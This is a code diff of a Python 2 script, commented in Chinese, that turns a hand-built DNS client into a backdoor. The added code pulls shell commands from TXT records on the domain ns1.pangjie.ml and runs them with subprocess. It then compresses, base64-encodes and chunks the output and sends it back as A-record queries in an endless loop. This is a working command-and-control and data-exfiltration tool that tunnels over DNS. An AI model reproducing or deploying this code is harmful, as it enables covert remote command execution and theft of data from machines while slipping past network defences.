@@ -4,7 +4,10 @@ import socket
 import struct
 import random
 import subprocess
+import Queue
 import zlib
+import base64
+import re
 
 dns_server = '8.8.8.8'
 port = 53
@@ -16,6 +19,7 @@ def dns_query(query_type, domain):
     # 构造dns协议头
     qtypt = {'A': 0x0001, 'TXT': 0x0010}
     id = random.randint(-32768, 32767)
+    idchars = struct.pack('!h', id)
     flags = 0x0100
     questions = 0x001
     auswerrrs = 0x0000
@@ -34,16 +38,15 @@ def dns_query(query_type, domain):
         domaintobyte += struct.pack(packstr, len(ds), ds)
     domaintobyte += '\0'
     # 拼接完整请求
-    print domaintobyte
     querydata = bufheader + domaintobyte + buftail
     sock.sendto(querydata, (dns_server, port))
-    return sock.recvfrom(1024)[0]
+    return sock.recvfrom(1024)[0], idchars
 
 
 # 解析返回包
 def dns_answer(domain):
-    data = dns_query('A', domain)
     # 跳过协议头
+    data = dns_query('TXT', domain)[0]
     bitnumber = 12
     # 应答资源数
     answerrrs = struct.unpack('!h', data[6:8])[0]
@@ -58,6 +61,7 @@ def dns_answer(domain):
         # 跳过表示指向请求中域名的c00c指针
         bitnumber += 2
         # 判断返回请求类型
+        # A请求
         if data[bitnumber:bitnumber+2] == '\x00\x01':
             # 跳过应答中的Type,Class In，TTL,data length
             bitnumber += 10
@@ -65,6 +69,7 @@ def dns_answer(domain):
             iptuple = struct.unpack('!BBBB', data[bitnumber:bitnumber+4])
             ipstr = '%d.%d.%d.%d' % iptuple
             print ipstr
+        # TXT请求
         elif data[bitnumber:bitnumber+2] == '\x00\x10':
             # 跳过应答中的Type,Class In，TTL,data length
             bitnumber += 10
@@ -81,14 +86,58 @@ def dns_answer(domain):
                 txt_text += i
             return txt_text
         
-        
+ 
+# 执行命令，zlib压缩命令输出再base64编码之后分割, 通过A请求发送到服务器
 def exec_command(domain):
     command = dns_answer(domain)
-    result = subprocess.check_output(command, shell=True)
-    print result
-            
+    print command
+    post_queue = Queue.Queue()
+    ss = zlib.compress(subprocess.check_output(command, shell=True))
+    ss_b64 = base64.b64encode(ss)
+    # 公共域名解析服务器在域名请求中不支持+ = 替换
+    ll = ss_b64.replace('+', '-').replace('=', '~')
+    # 分割
+    textArr = re.findall('.{51}', ll)
+    textArr.append(ll[(len(textArr) * 51):])
+    length = len(textArr)
+    if length / 4 != 0:
+        mod = length % 4
+        for i in range(length / 4):
+            post_queue.put(textArr[i * 4 + 0] + '.' + textArr[i * 4 + 1] + '.' + textArr[i * 4 + 2] + '.' +
+                textArr[i * 4 + 3])
+        for i in range(mod):
+            post_queue.put(textArr[length / 4 * 4 + i])
+        # 以end 标志传输完成
+        post_queue.put('end')
+
+    else:
+        for i in range(length):
+            post_queue.put(textArr[i])
+        post_queue.put('end')
+    while post_queue.empty() is not True:
+        dns_query('A', post_queue.get() + '.' + domain)
+        
+
+def connect():
+    for i in range(10):
+        try:
+            data, id = dns_query('A', 'success.ns1.pangjie.ml')
+            if data[0:2] == id:
+                return True
+                break
+            else:
+                return False
+        except:
+            pass
+    
 
 if __name__ == '__main__':
-    dns_query('A', '+.ns1.pangjie.ml')
+    domain = 'ns1.pangjie.ml'
+    # if connect():
+    while True:
+        exec_command(domain)
+        
+
+
 
 
